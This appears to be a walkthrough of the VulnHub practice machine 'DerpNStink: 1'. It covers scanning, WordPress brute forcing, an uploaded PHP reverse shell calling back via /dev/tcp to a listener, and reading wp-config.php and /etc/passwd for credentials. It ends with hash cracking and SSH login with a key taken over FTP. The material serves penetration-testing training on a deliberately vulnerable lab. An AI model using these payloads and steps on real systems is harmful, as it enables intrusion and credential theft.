::::::::::::::::::::::::::::::::::: page
# DerpNStink: 1 {#derpnstink-1 .title}

\

## 

## DerpNStink: 1

- **[DerpNStink: 1]{style="color:#663e0e;"}** :-

<!-- -->

- Download the machine :
  <https://www.vulnhub.com/entry/derpnstink-1,221/>

![](images/778-1.png)

- Open ova file .
- Then click finish .
- Start the machine .

1.  [Network Scanning]{style="color:#3584e4;"} :

- Find the machine IP :

::: codebox
    nmap -sn 192.168.2.0/24
:::

![](images/778-2.png)

- Run nmap master command :

::: codebox
    nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.105
:::

![](images/778-3.png)

- Find available port in the machine ( Optional ) :

::: codebox
    nmap -v -p- 192.168.2.247
:::

- 

::: codebox
    nmap -sC -sV -A 192.168.2.247
:::

- This command runs an aggressive scan and uses the http-enum script to
  identify potential CGI directories .

::: codebox
    nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.247
:::

![](images/778-4.png)

1.  [Web Enumeration]{style="color:#3584e4;"} :

- IP visit in browser : <http://192.168.2.247/>

<!-- -->

- Run dirsearch to brute force :

::: codebox
    dirsearch -u http://192.168.2.247
:::

![](images/778-5.png)

- Visit the parameter : <http://192.168.2.247/robots.txt>
  <http://192.168.2.247/weblog/wp-login.php>
  [http://192.168.2.247/php/phpmyadmin/](http://192.168.2.108/php/phpmyadmin/)

<!-- -->

- Entry in host file :

::: codebox
    nano /etc/hosts
:::

![](images/778-6.png)

- Then visit the hostname : <http://derpnstink.local/weblog/>
  <http://derpnstink.local/weblog/wp-login.php>

<!-- -->

- Find wordpress username :

::: codebox
    wpscan --url http://derpnstink.local/weblog -e u
:::

![](images/778-7.png)

- Find wordpress password :

::: codebox
    wpscan --url http://derpnstink.local/weblog --usernames admin --passwords /opt/rockyou.txt
:::

![](images/778-8.png)

- Now Login wordpress : <http://derpnstink.local/weblog/wp-login.php>

::: codebox
    Username : admin
    Password : admin
:::

1.  [Reverse Shell]{style="color:#3584e4;"} :

- Make a reverse shell file :

::: codebox
    nano reverse_shell.php
:::

- Add the reverse shell payload :

::: codebox
    <?php `/bin/bash -c 'bash -i >& /dev/tcp/192.168.2.219/443 0>&1'`; ?>
:::

- After login the wordpress the go to Slideshow :

::: codebox
    Slideshow > Manage slides
:::

![](images/778-9.png) Click on edit .

- Start the listener :

::: codebox
    nc -nlvp 443
:::

- Now upload the file :

![](images/778-10.png)

- Get the shell :

![](images/778-11.png)

- Navigate the directory :

::: codebox
    cd /var/www/html/weblog
:::

- 

::: codebox
    ls
:::

![](images/778-12.png)

- Read the config.php file :

::: codebox
    cat wp-config.php
:::

![](images/778-13.png)

Database Credentials :

::: codebox
    DB_NAME = wordpress
    DB_USER = root
    DB_PASSWORD = mysql
    DB_HOST = localhost
:::

- Now login phpmyadmin :

![](images/778-14.png)

- Go to wordpress then wp_users :

![](images/778-15.png) Found user and password hash .

::: codebox
    User : unclestinky
    Hash : $P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41
:::

- Password Hash crack :

::: codebox
    hashid '$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41'
:::

::: codebox
    echo '$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41' > hash.txt
:::

![](images/778-16.png)

- Crack with hashcat :

::: codebox
    hashcat -m 400 hash.txt /opt/rockyou.txt
:::

- 

![](images/778-17.png)

- Read /etc/passwd file :

::: codebox
    cat /etc/passwd
:::

![](images/778-18.png)

- Normal user found :

::: codebox
    stinky 
    mrderp
:::

1.  [FTP Enumeration]{style="color:#3584e4;"} :

- FTP login :

::: codebox
    ftp 192.168.2.247 
:::

![](images/778-19.png)

- Navigate the directory :

::: codebox
    cd /files/ssh/ssh/ssh/ssh/ssh/ssh/ssh
:::

- 

::: codebox
    ls
:::

![](images/778-20.png)

- Download the file :

::: codebox
    get key.txt
:::

![](images/778-21.png)

![](images/778-22.png)

1.  [SSH Connection Access]{style="color:#3584e4;"} :

- Verify Key :

::: codebox
    ssh-keygen -lf key.txt
:::

- 

::: codebox
    head -1 key.txt
:::

![](images/778-23.png)

- Get the permission :

::: codebox
    chmod 600 key.txt
:::

- SSH Login :

::: codebox
    ssh -o PubkeyAcceptedAlgorithms=+ssh-rsa -o HostKeyAlgorithms=+ssh-rsa -i key.txt stinky@192.168.2.247
:::

![](images/778-24.png)
:::::::::::::::::::::::::::::::::::
